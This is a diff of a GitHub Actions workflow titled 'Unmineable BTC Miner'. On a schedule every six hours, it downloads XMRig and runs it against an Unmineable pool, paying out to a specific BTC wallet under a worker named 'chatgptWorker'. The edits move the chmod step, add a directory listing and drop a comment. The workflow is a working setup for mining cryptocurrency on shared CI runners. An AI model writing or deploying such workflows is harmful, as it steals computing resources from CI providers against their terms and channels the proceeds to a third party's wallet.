@@ -3,7 +3,7 @@ name: Unmineable BTC Miner
 on:
 workflow_dispatch:
 schedule:
-- cron: "0 */6 * * *" # Jalan otomatis setiap 6 jam
+- cron: "0 */6 * * *"
 
 jobs:
 mine:
@@ -20,12 +20,13 @@ steps:
       wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
       tar -xvf xmrig-6.24.0-linux-static-x64.tar.gz
 
-  - name: Set permission
-    run: chmod +x xmrig-6.24.0/xmrig
+  - name: List directory to verify extract
+    run: ls -la
 
   - name: Run miner
     run: |
       cd xmrig-6.24.0
+      chmod +x xmrig
       ./xmrig -a rx -o rx.unmineable.com:3333 \
         -u BTC:bc1ql83n6aql33keyqygsggq5zaczuefmlyrpv9h49.chatgptWorker \
         -p x -k --tls
